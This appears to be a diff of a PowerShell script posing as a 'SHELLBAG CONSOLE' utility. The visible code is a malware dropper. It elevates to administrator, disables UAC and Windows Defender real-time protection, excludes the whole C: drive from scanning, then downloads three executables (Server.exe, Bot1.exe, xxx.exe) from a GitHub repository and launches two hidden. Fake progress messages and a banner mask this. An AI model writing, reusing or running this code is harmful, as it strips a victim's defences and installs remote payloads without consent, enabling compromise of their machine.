@@ -4,19 +4,14 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
     Exit
 }
-
-
 Write-Host "50%"
-
 $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force
 Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
-
 Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
-
 Write-Host "100%"
 $url1 = "https://github.com/sys1e/cmd/raw/refs/heads/main/Server.exe"
 $url2 = "https://github.com/sys1e/cmd/raw/refs/heads/main/Bot1.exe"
@@ -25,18 +20,13 @@ $path1 = "$env:TEMP\Server.exe"
 $path2 = "$env:TEMP\Bot1.exe"
 $path3 = "$env:TEMP\xxx.exe"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-
 Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
 Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction SilentlyContinue
 Invoke-WebRequest -Uri $url3 -OutFile $path3 -UseBasicParsing -ErrorAction SilentlyContinue
-
 Start-Process -FilePath $path1 -WindowStyle Hidden
 Start-Process -FilePath $path2 -WindowStyle Hidden
-
 Clear-Host
 $Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | MODULE"
-
-
 function Show-KRAKEH-Header {
     # Очищаем область заголовка
     $headerArt = @"
